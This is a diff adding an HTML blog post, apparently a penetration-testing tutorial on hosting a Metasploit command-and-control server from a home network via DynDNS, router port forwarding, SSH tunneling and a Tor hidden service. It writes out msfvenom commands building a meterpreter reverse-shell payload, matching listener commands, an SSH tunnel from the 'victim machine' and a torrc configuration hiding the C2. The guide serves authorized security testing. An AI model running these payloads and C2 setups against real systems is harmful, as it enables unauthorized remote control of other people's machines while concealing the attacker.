@@ -1,0 +1,153 @@
+<html>
+<head>
+<title>Blog|sticky-bit-1</title>
+<link rel="stylesheet" href="../../css/blog.css">
+</head>
+<body>
+<main>
+<h1
+id="c2-server-from-the-home-network-a-complete-guide-using-home-router-configuration">C2 Server From the Home Network: A Complete Guide Using Home Router
+Configuration</h1>
+<h2 id="introduction">Introduction</h2>
+<p>Have you ever faced the challenge of testing Remote Code Execution
+(RCE) vulnerabilities or antivirus bypass techniques on Windows clients
+when your testing environment doesn’t have a public IP address? This is
+a common scenario for penetration testers and security researchers
+working from home networks. In this comprehensive guide, I’ll
+demonstrate how to establish a reverse shell connection back to your
+local Command and Control (C2) server using only a standard home router
+- all with a zero-cost setup.</p>
+<h2 id="understanding-the-challenge">Understanding the Challenge</h2>
+<p>When conducting security assessments or research, establishing a
+reverse shell from a target system back to your testing machine can be
+problematic if you’re working from a private network. Traditional
+methods assume that you have a publicly accessible server. However, this
+is not necessarily true, as you will see shortly.</p>
+<h2 id="prerequisites-and-router-requirements">Prerequisites and Router
+Requirements</h2>
+<p>To implement this solution, your router must support two essential
+features:</p>
+<ul>
+<li><strong>Dynamic DNS (DynDSN)</strong> - Maps a domain name to your changing public IP address</li>
+<li><strong>Port Forwarding</strong> - Redirects external connections to internal network devices</li>
+</ul>
+<p>Most modern home routers include these features by default. The
+examples in this guide use a FRITZ!Box 7530AX from German manufacturer
+AVM, but the concepts apply to any router with similar capabilities.</p>
+<h3 id="step-1-setting-up-dynamic-dns">Step 1: Setting Up Dynamic
+DNS</h3>
+<h4 id="why-use-dyndns">Why Use DynDNS?</h4>
+<p>Since ISPs typically assign dynamic public IP addresses that change
+periodically, relying on the IP address directly is impractical. DynDNS
+solves this by providing a stable domain name that automatically updates
+to point to your current public IP.</p>
+<h4 id="configuration-process">Configuration Process</h4>
+<ol type="1">
+<li><strong>Register for a DynDNS Service</strong>: Use a domain
+provider that supports this feature, or use a free service like
+no-ip.com to obtain a free domain</li>
+<li><strong>Router Configuration</strong>: Access you router’s web
+interface and navigate to the DynDNS settings sectioin</li>
+</ol>
+<figure>
+<img src="./img/001_01_dyndns.png" alt="DynDNS" />
+<figcaption aria-hidden="true">FRITZ!Box GUI: the “Use DynDNS” checkbox must be enabled, and you’ll need to enter your domain name, username, and password from your DynDNS provider</figcaption>
+</figure>
+<h3 id="step-2-configuring-port-forwarding">Step 2: Configuring Port
+Forwarding</h3>
+<p>Port forwarding is the mechanism that routes external connections
+from the internet to specific devices on your internal network.</p>
+<h4 id="creating-a-new-port-forwarding-rule">Creating a New Port
+Forwarding Rule</h4>
+<figure>
+<img src="./img/001_03_port_forwarding.png" alt="Port Forwarding" />
+<figcaption aria-hidden="true">FRITZ!Box GUI: you have to add new device from the list of
+available hosts in your home network</figcaption>
+</figure>
+<h4 id="detailed-port-forwarding-configuration">Detailed Port Forwarding
+Configuration</h4>
+<figure>
+<img src="./img/001_04_port_forwarding.png" alt="Port Forwarding" />
+<figcaption aria-hidden="true">FRITZ!Box GUI: you have to specify protocol depending on your requirements and port to device the external connection will be forwarded to. Enable Sharing must be checked to activate the rule.</figcaption>
+</figure>
+<h4 id="final-port-forwarding-setup">Final Port Forwarding Setup</h4>
+<figure>
+<img src="./img/001_02_port_forwarding.png" alt="Port Forwarding" />
+<figcaption aria-hidden="true">FRITZ!Box GUI: Port Sharing setup</figcaption>
+</figure>
+<h3 id="step-3-creating-the-reverse-shell-payload">Step 3: Creating the
+Reverse Shell Payload</h3>
+<p>With networking configured, create your reverse shell payload using
+msfvenom:</p>
+<pre><code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=&lt;either public IP address or DynDNS domain name&gt; lport=1337 -f elf -o met1337.elf</code></pre>
+<p>This command creates a Linux ELF executable that will connect back to
+your DynDNS domain on port 1337.</p>
+<h3 id="step-4-setting-up-the-listener">Step 4: Setting Up the
+Listener</h3>
+<p>On your C2 host, start a Metasploit listener:</p>
+<pre><code>msfconsole -q -x &#39;use multi/handler ; set payload linux/x64/meterpreter/reverse_tcp ; set lhost &lt;C2&#39;s IP&gt;; set lport 1337; exploit&#39;</code></pre>
+<figure>
+<img src="./img/001_06_revshell_simple.png" alt="Port Forwarding" />
+<figcaption aria-hidden="true">A reverse shell connection was successfully established</figcaption>
+</figure>
+<h2 id="advanced-security-adding-ssh-tunneling">Advanced Security:
+Adding SSH Tunneling</h2>
+<p>For enhanced security, you can route your reverse shell traffic through an encrypted SSH tunnel</p>
+<h3 id="ssh-tunnel-configuration">SSH Tunnel Configuration</h3>
+<p>First, set up port forwarding for SSH</p>
+<figure>
+<img src="./img/001_05_ssh_port_forwarding.png" alt="Port Forwarding" />
+<figcaption aria-hidden="true">FRITZ!Box’s Web Interface: protocol ssh:// and port to device</figcaption>
+</figure>
+<p>Create an SSH tunnel from the victim machine back to your C2 server
+via SSH local port forwarding:</p>
+<pre><code>ssh -N -L 127.0.0.1:1337:127.0.0.1:1337 kali@&lt;public IP or DynDNS domain name&gt;</code></pre>
+<figure>
+<img src="./img/001_07_ssh_local_port_forwarding.png" alt="SSH Local Port Forwarding" />
+<figcaption aria-hidden="true">Port 1337 is bound to localhost on the victim machine</figcaption>
+</figure>
+<p>When using SSH tunneling, both Metasploit listener and Metasploit beacon should be modified appropriately:</p>
+<pre><code>msfconsole -q -x &#39;use multi/handler ; set payload linux/x64/meterpreter/reverse_tcp ; set lhost 127.0.0.1; set lport 1337; set ReverseListenerBindAddress 127.0.0.1; set ReverseListenerBindPort 1337; exploit&#39;</code></pre>
+<pre><code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=1337 -f elf -o met1337.elf</code></pre>
+<figure>
+<img src="./img/001_08_established_revershe_shell_over_ssh.png"
+alt="Port Forwarding" />
+<figcaption aria-hidden="true">Successfully established a reverse shell connection over an SSH tunnel</figcaption>
+</figure>
+<h3 id="maximum-privacy-adding-tor-to-the-mix">Maximum Privacy: Adding Tor to the Mix</h3>
+<p>You can add a privacy level by pushing all traffic over the Tor
+network.</p>
+<h4 id="tor-configuration">Tor Configuration</h4>
+<p>The Tor configuration typically involves modifying the /etc/tor/torrc
+file:</p>
+<pre><code>
+ControlPort 9051
+CookieAuthentication 1
+CookieAuthFileGroupReadable 1
+
+HiddenServiceDir /var/lib/tor/hidden_service_ssh/
+HiddenServiceVersion 3
+HiddenServicePort 22 192.168.178.51:22</code></pre>
+<p>After restarting the tor service on your C2 server, check the file
+/var/lib/tor/hidden_service_ssh/hostname file to find the Tor address of
+your C2 server.</p>
+<p>For establishing an SSH tunnel over Tor, use the torify command as
+follows:</p>
+<figure>
+<img src="./img/001_11_ssh_over_tor.png" alt="Port Forwarding" />
+<figcaption aria-hidden="true">Creating an SSH local port forwarding over the Tor network</figcaption>
+</figure>
+<p>The reverse shell connection remains the same, but traffic now routes
+through the Tor network for enhanced privacy.</p>
+<h3 id="conclusion">Conclusion</h3>
+<p>This guide demonstrates how to establish a reverse shell connection
+to your local testing environment using standard home networking
+equipment. By combining DynDNS, port forwarding, and optional security
+layers like SSH tunneling and Tor, you can create a robust testing
+infrastructure without requiring expensive hosting solutions.</p>
+<p>Remember to use these techniques only in authorized testing
+environments and always follow responsible disclosure practices when
+conducting security research.</p>
+</main>
+</body>
+</html>
